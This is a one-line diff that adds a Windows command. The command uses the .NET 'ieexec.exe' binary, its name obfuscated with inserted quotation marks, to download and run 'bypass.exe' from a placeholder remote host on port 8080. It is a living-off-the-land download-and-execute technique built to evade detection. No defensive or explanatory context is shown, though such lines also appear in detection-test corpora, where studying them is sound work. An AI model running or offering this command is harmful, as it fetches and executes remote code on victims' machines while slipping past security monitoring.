@@ -1,0 +1,1 @@
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727\i"eexe"c.exe http://x.x.x.x:8080/bypass.exe
